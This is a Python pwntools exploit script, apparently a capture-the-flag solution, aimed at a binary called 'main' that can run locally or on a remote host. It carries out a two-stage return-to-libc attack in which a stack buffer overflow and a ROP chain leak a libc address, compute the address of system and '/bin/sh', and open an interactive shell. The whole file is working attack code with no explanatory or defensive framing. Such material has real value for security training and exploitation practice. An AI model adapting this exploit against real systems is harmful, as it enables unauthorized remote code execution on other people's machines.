#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './main'
libc_path = './libc.so.6'

# Gadgets and offsets
POP_RDI = 0x40114a
RET = 0x40114b
OFFSET = 72

# Libc offsets
PUTS_OFFSET = 0x805a0
SYSTEM_OFFSET = 0x53110
BINSH_OFFSET = 0x1a7ea4

def exploit(io):
    elf = ELF(binary, checksec=False)

    # Addresses
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.symbols['main']

    # Stage 1: Leak libc
    log.info("Stage 1: Leaking libc base...")

    io.recvuntil(b'data:')

    payload = flat(
        b'A' * OFFSET,
        POP_RDI, puts_got,
        puts_plt,
        main
    )
    io.sendline(payload)

    # Parse leak
    io.recvline()
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))

    libc_base = leak - PUTS_OFFSET
    system = libc_base + SYSTEM_OFFSET
    binsh = libc_base + BINSH_OFFSET

    log.success(f"Libc base: {hex(libc_base)}")

    log.info("Stage 2: Spawning shell...")

    io.recvuntil(b'data:')

    payload = flat(
        b'A' * OFFSET,
        RET,           # Align stack
        POP_RDI, binsh,
        system
    )
    io.sendline(payload)

    log.success("Enjoy your shell!")
    io.interactive()

if __name__ == '__main__':
    context.log_level = 'info'
    context.arch = 'amd64'

    if args.REMOTE:
        host = args.HOST or 'localhost'
        port = int(args.PORT or 2711)
        io = remote(host, port)
    else:
        io = process(binary)

    exploit(io)
